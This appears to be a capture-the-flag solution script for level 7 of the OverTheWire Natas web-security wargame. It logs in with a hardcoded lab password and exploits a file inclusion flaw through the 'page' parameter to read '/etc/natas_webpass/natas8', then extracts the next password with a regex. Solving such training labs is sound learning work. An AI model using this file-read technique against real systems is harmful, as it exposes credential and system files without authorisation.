#!/usr/bin/python3

import requests
import re

level = 7
username = 'natas%s' % level
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = 'http://%s.natas.labs.overthewire.org/' % username

# First request testing
response = requests.get(url, auth=(username, password))

# This one is simple - just exploiting a direct interface with the filesystem. The first request
# states that the key is stored in /etc/natas_webpass/natas8, and analysis of the code shows we can
# likely navigate there by using the functionality on index.php: 'index.php?page=/etc/natas_webpass/natas8'
etc_response = requests.get(url + 'index.php?page=/etc/natas_webpass/natas8', auth=(username, password))

# That should do it - now print the password
password = re.findall('<br>\n<br>\n(.*)\n\n', etc_response.text)[0]
print(password)

